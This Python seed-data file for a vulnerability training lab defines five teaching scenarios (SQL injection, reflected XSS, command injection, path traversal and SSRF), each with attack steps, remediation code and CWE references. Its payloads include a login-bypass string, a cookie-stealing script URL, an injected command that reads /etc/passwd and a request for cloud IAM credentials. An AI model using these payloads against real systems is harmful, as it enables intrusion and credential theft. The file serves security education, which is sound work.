# -*- coding: utf-8 -*-
"""
app.services.lab_init
---------------------
漏洞实验室初始数据。
"""

from typing import List, Dict, Any
from sqlalchemy.orm import Session


# 预设的漏洞场景数据
DEFAULT_SCENARIOS: List[Dict[str, Any]] = [
    {
        "name": "SQL注入 - 登录绕过",
        "vuln_type": "SQLI",
        "difficulty": "easy",
        "description": "这是一个经典的SQL注入漏洞场景。登录表单未对用户输入进行过滤，直接拼接到SQL查询中，导致攻击者可以构造恶意输入绕过认证。",
        "tags": ["SQL注入", "认证绕过", "OWASP Top 10"],
        "attack_steps": [
            {
                "step": 1,
                "title": "分析登录表单",
                "description": "首先，攻击者访问登录页面，分析登录表单的结构和提交方式。",
                "request": {
                    "method": "GET",
                    "url": "http://target.com/login",
                    "description": "访问登录页面"
                },
                "result": "发现登录表单包含 username 和 password 两个字段"
            },
            {
                "step": 2,
                "title": "构造注入Payload",
                "description": "攻击者构造恶意的SQL注入Payload，尝试绕过登录验证。",
                "payload": "admin' OR '1'='1",
                "payload_explanation": "单引号闭合字符串，OR '1'='1' 使条件永远为真，从而绕过密码验证。"
            },
            {
                "step": 3,
                "title": "发送恶意请求",
                "description": "将构造好的Payload发送到服务器。",
                "request": {
                    "method": "POST",
                    "url": "http://target.com/login",
                    "headers": {
                        "Content-Type": "application/x-www-form-urlencoded"
                    },
                    "body": "username=admin'+OR+'1'%3D'1&password=xxx"
                },
                "response": {
                    "status": 200,
                    "body": "登录成功！欢迎管理员"
                }
            },
            {
                "step": 4,
                "title": "漏洞触发成功",
                "description": "成功绕过认证，获取管理员权限。",
                "result": "攻击成功！无需密码即可登录管理员账户。"
            }
        ],
        "remediation": [
            {
                "title": "使用预编译语句（参数化查询）",
                "description": "使用参数化查询可以有效防止SQL注入，因为用户输入不会被当作SQL代码执行。",
                "code": "# Python 示例\nimport sqlite3\nconn = sqlite3.connect('database.db')\ncursor = conn.cursor()\ncursor.execute('SELECT * FROM users WHERE username = ? AND password = ?', (username, password))",
                "language": "python"
            },
            {
                "title": "输入验证和过滤",
                "description": "对用户输入进行严格的验证和过滤，拒绝或转义特殊字符。",
                "code": "# PHP 示例\n$username = mysqli_real_escape_string($conn, $_POST['username']);"
            },
            {
                "title": "最小权限原则",
                "description": "数据库连接应使用具有最小必要权限的账户，限制潜在的损害范围。"
            }
        ],
        "learning": {
            "principle": "SQL注入是一种代码注入技术，攻击者通过在应用程序的输入字段中插入恶意SQL代码，操纵后端数据库执行非预期的操作。",
            "cwe": "CWE-89",
            "owasp": "A03:2021 - Injection",
            "impact": "攻击者可以绕过认证、窃取数据库中的敏感信息、修改或删除数据。",
            "references": [
                "https://owasp.org/www-community/attacks/SQL_Injection",
                "https://cwe.mitre.org/data/definitions/89.html"
            ]
        }
    },
    {
        "name": "反射型XSS - 搜索功能",
        "vuln_type": "XSS_REFLECTED",
        "difficulty": "easy",
        "description": "反射型跨站脚本攻击（Reflected XSS）发生在应用程序将用户输入未经过滤直接返回到页面中。",
        "tags": ["XSS", "跨站脚本", "反射型", "OWASP Top 10"],
        "attack_steps": [
            {
                "step": 1,
                "title": "发现注入点",
                "description": "攻击者发现搜索功能会将搜索词直接显示在页面上。",
                "request": {
                    "method": "GET",
                    "url": "http://target.com/search?q=test"
                },
                "response": {
                    "body": "<div>您搜索的是: test</div>"
                }
            },
            {
                "step": 2,
                "title": "测试XSS漏洞",
                "description": "注入简单的XSS Payload测试是否存在漏洞。",
                "payload": "<script>alert('XSS')</script>",
                "payload_explanation": "如果页面弹窗显示XSS，说明脚本被执行，存在XSS漏洞。"
            },
            {
                "step": 3,
                "title": "构造恶意链接",
                "description": "构造包含恶意脚本的URL，诱导受害者点击。",
                "request": {
                    "method": "GET",
                    "url": "http://target.com/search?q=<script>steal_cookie()</script>"
                },
                "result": "当用户点击此链接时，其Cookie会被发送到攻击者的服务器。"
            },
            {
                "step": 4,
                "title": "漏洞触发成功",
                "description": "攻击者获取受害者Cookie，可以劫持会话。",
                "result": "成功窃取用户Cookie，可以冒充受害者身份。"
            }
        ],
        "remediation": [
            {
                "title": "输出编码",
                "description": "在将用户输入输出到HTML页面之前，进行HTML实体编码。",
                "code": "# Python 示例\nfrom html import escape\nsafe_output = escape(user_input)",
                "language": "python"
            },
            {
                "title": "使用内容安全策略（CSP）",
                "description": "配置CSP头部，限制脚本的执行来源。",
                "code": "Content-Security-Policy: default-src 'self'; script-src 'self'"
            },
            {
                "title": "设置HttpOnly Cookie",
                "description": "为敏感Cookie设置HttpOnly属性，防止JavaScript访问。",
                "code": "Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict"
            }
        ],
        "learning": {
            "principle": "跨站脚本攻击（XSS）是一种代码注入攻击，攻击者将恶意脚本注入到网页中。",
            "cwe": "CWE-79",
            "owasp": "A03:2021 - Injection",
            "impact": "攻击者可以窃取用户Cookie、会话令牌，劫持用户账户。",
            "references": [
                "https://owasp.org/www-community/attacks/xss/",
                "https://portswigger.net/web-security/cross-site-scripting"
            ]
        }
    },
    {
        "name": "命令注入 - Ping功能",
        "vuln_type": "CMD_INJECTION",
        "difficulty": "medium",
        "description": "命令注入漏洞允许攻击者在服务器上执行任意操作系统命令。",
        "tags": ["命令注入", "RCE", "OS Command Injection", "高危"],
        "attack_steps": [
            {
                "step": 1,
                "title": "发现注入点",
                "description": "攻击者发现一个网络诊断功能，可以输入IP地址执行Ping命令。",
                "request": {
                    "method": "POST",
                    "url": "http://target.com/api/ping",
                    "body": "ip=127.0.0.1"
                },
                "response": {
                    "body": "PING 127.0.0.1: 56 data bytes"
                }
            },
            {
                "step": 2,
                "title": "测试命令注入",
                "description": "使用命令分隔符尝试注入额外命令。",
                "payload": "127.0.0.1; id",
                "payload_explanation": "; 是Unix/Linux命令分隔符，允许在一条命令后执行另一条命令。"
            },
            {
                "step": 3,
                "title": "确认漏洞并获取敏感信息",
                "description": "确认漏洞存在后，攻击者可以执行更多命令。",
                "request": {
                    "method": "POST",
                    "url": "http://target.com/api/ping",
                    "body": "ip=127.0.0.1; cat /etc/passwd"
                },
                "response": {
                    "body": "root:x:0:0:root:/root:/bin/bash"
                }
            },
            {
                "step": 4,
                "title": "漏洞触发成功",
                "description": "攻击者成功读取了系统敏感文件。",
                "result": "成功获取系统用户信息，可以进一步探索系统。"
            }
        ],
        "remediation": [
            {
                "title": "避免直接执行系统命令",
                "description": "尽可能使用编程语言提供的API代替直接调用系统命令。",
                "code": "# Python 示例\nimport socket\ndef check_host(host):\n    try:\n        socket.gethostbyname(host)\n        return True\n    except socket.error:\n        return False"
            },
            {
                "title": "输入验证（白名单）",
                "description": "对用户输入进行严格的白名单验证。",
                "code": "import re\npattern = r'^\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}$'"
            },
            {
                "title": "使用安全的命令执行函数",
                "description": "使用参数化方式执行命令，避免shell解析。",
                "code": "import subprocess\nresult = subprocess.run(['ping', '-c', '1', ip], capture_output=True)"
            }
        ],
        "learning": {
            "principle": "命令注入（OS Command Injection）是一种严重的安全漏洞，攻击者可以通过Web应用程序在服务器上执行任意操作系统命令。",
            "cwe": "CWE-78",
            "owasp": "A03:2021 - Injection",
            "impact": "攻击者可以在服务器上执行任意命令，完全控制服务器。",
            "references": [
                "https://owasp.org/www-community/attacks/Command_Injection",
                "https://portswigger.net/web-security/os-command-injection"
            ]
        }
    },
    {
        "name": "本地文件包含 - 文件读取",
        "vuln_type": "LFI",
        "difficulty": "medium",
        "description": "本地文件包含（LFI）漏洞允许攻击者通过Web应用读取服务器上的敏感文件。",
        "tags": ["文件包含", "LFI", "路径穿越", "信息泄露"],
        "attack_steps": [
            {
                "step": 1,
                "title": "发现文件加载功能",
                "description": "攻击者发现一个文件预览功能，可以通过参数指定文件名。",
                "request": {
                    "method": "GET",
                    "url": "http://target.com/view?file=document.pdf"
                }
            },
            {
                "step": 2,
                "title": "测试路径穿越",
                "description": "使用../序列尝试访问上级目录。",
                "payload": "../../../etc/passwd",
                "payload_explanation": "../ 表示上级目录，多个../ 可以穿越到系统根目录。"
            },
            {
                "step": 3,
                "title": "读取敏感文件",
                "description": "成功穿越目录后，读取系统敏感文件。",
                "request": {
                    "method": "GET",
                    "url": "http://target.com/view?file=....//....//....//etc/passwd"
                },
                "response": {
                    "body": "root:x:0:0:root:/root:/bin/bash"
                }
            },
            {
                "step": 4,
                "title": "漏洞触发成功",
                "description": "攻击者成功读取了系统敏感文件。",
                "result": "成功读取包含数据库密码的配置文件。"
            }
        ],
        "remediation": [
            {
                "title": "避免使用用户输入构造文件路径",
                "description": "如果可能，不要直接使用用户输入来构造文件路径。"
            },
            {
                "title": "输入验证和白名单",
                "description": "只允许预定义的文件名或使用ID映射。",
                "code": "ALLOWED_FILES = {'doc1': '/var/www/files/document1.pdf'}\nif file_id in ALLOWED_FILES:\n    filepath = ALLOWED_FILES[file_id]"
            },
            {
                "title": "路径规范化和验证",
                "description": "使用realpath验证最终路径是否在允许的目录内。",
                "code": "import os\nreal_path = os.path.realpath(requested_path)\nif not real_path.startswith(base_dir):\n    return 'Access denied', 403"
            }
        ],
        "learning": {
            "principle": "本地文件包含（LFI）漏洞发生在应用程序使用用户可控的输入来构建文件路径时。",
            "cwe": "CWE-22",
            "owasp": "A01:2021 - Broken Access Control",
            "impact": "攻击者可以读取服务器上的任意文件，包括敏感配置文件。",
            "references": [
                "https://owasp.org/www-community/attacks/Path_Traversal",
                "https://portswigger.net/web-security/file-path-traversal"
            ]
        }
    },
    {
        "name": "SSRF - 内网探测",
        "vuln_type": "SSRF",
        "difficulty": "hard",
        "description": "服务端请求伪造（SSRF）漏洞允许攻击者利用服务器发起请求，访问内部网络资源。",
        "tags": ["SSRF", "服务端请求伪造", "内网探测", "云安全"],
        "attack_steps": [
            {
                "step": 1,
                "title": "发现URL获取功能",
                "description": "攻击者发现一个可以指定URL来获取内容的API端点。",
                "request": {
                    "method": "POST",
                    "url": "http://target.com/api/fetch",
                    "body": "url=http://example.com"
                }
            },
            {
                "step": 2,
                "title": "测试SSRF漏洞",
                "description": "尝试访问内部网络地址。",
                "payload": "http://127.0.0.1:80",
                "payload_explanation": "尝试访问本地服务，如果返回响应，说明服务器会访问用户指定的URL。"
            },
            {
                "step": 3,
                "title": "探测内网服务",
                "description": "扫描内网IP段，发现内部服务。",
                "request": {
                    "method": "POST",
                    "url": "http://target.com/api/fetch",
                    "body": "url=http://192.168.1.1:8080/admin"
                },
                "response": {
                    "body": "<html><title>Admin Panel</title>"
                }
            },
            {
                "step": 4,
                "title": "访问云元数据服务",
                "description": "在云环境中，尝试访问元数据服务获取敏感信息。",
                "request": {
                    "method": "POST",
                    "url": "http://target.com/api/fetch",
                    "body": "url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
                },
                "result": "成功获取AWS IAM临时凭证。"
            }
        ],
        "remediation": [
            {
                "title": "URL白名单验证",
                "description": "只允许访问预定义的白名单域名。",
                "code": "from urllib.parse import urlparse\nALLOWED_DOMAINS = ['example.com']\nif urlparse(url).hostname not in ALLOWED_DOMAINS:\n    return 'Blocked', 403"
            },
            {
                "title": "禁用私有IP访问",
                "description": "验证解析后的IP地址不是私有地址。",
                "code": "import ipaddress, socket\nip = socket.gethostbyname(hostname)\nif ipaddress.ip_address(ip).is_private:\n    return 'Blocked', 403"
            },
            {
                "title": "网络隔离",
                "description": "将应用服务器与内部网络隔离，限制其访问内网资源的能力。"
            }
        ],
        "learning": {
            "principle": "服务端请求伪造（SSRF）是一种安全漏洞，攻击者可以利用服务器发起请求，访问用户无法直接访问的资源。",
            "cwe": "CWE-918",
            "owasp": "A10:2021 - Server-Side Request Forgery (SSRF)",
            "impact": "攻击者可以探测内网结构、访问内部服务、获取云服务凭证。",
            "references": [
                "https://owasp.org/www-community/attacks/Server_Side_Request_Forgery",
                "https://portswigger.net/web-security/ssrf"
            ]
        }
    }
]


def init_lab_scenarios(db: Session) -> int:
    """
    初始化漏洞实验室场景数据。
    
    Args:
        db: 数据库会话
        
    Returns:
        创建的场景数量
    """
    from app.models.lab import LabScenario
    
    # 检查是否已有场景
    existing_count = db.query(LabScenario).count()
    if existing_count > 0:
        return 0
    
    # 批量插入场景
    created_count = 0
    for scenario_data in DEFAULT_SCENARIOS:
        scenario = LabScenario(
            name=scenario_data["name"],
            vuln_type=scenario_data["vuln_type"],
            difficulty=scenario_data["difficulty"],
            description=scenario_data.get("description"),
            attack_steps=scenario_data.get("attack_steps", []),
            remediation=scenario_data.get("remediation", []),
            learning=scenario_data.get("learning", {}),
            tags=scenario_data.get("tags", []),
            is_active=True,
        )
        db.add(scenario)
        created_count += 1
    
    db.commit()
    return created_count
